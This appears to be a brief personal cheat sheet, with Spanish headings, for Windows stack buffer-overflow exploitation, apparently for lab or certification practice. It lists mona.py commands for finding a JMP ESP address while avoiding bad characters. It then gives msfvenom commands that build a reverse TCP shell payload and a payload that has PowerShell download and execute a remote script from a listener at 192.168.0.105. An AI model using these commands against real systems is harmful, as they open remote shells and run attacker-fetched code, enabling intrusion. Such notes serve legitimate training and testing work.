## MONA
#### Configurar carpeta de trabajo
!mona -set workingfolder C:\Users\win7bits\Desktop\%p

#### ENCONTRAR EL PUNTO DE SALTO
!mona jmp -r esp -cpb \x07\x2e\xa0\x00"


## SHELLCODE
#### CMD
msfvenom -p windows/shell_reverse_tcp lhost=192.168.0.105 lport=4444 EXITFUNC=thread -a x86 --platform windows -b "\x00" -f c
#### POWERSHELL
msfvenom -p windows/exec CMD="powershell IEX(New-Object Net.WebClient).downloadString('http://192.168.0.105:8000/PS.ps1')" lhost=192.168.0.105 lport=4444 EXITFUNC=thread -a x86 --platform windows -b "\x00" -f c

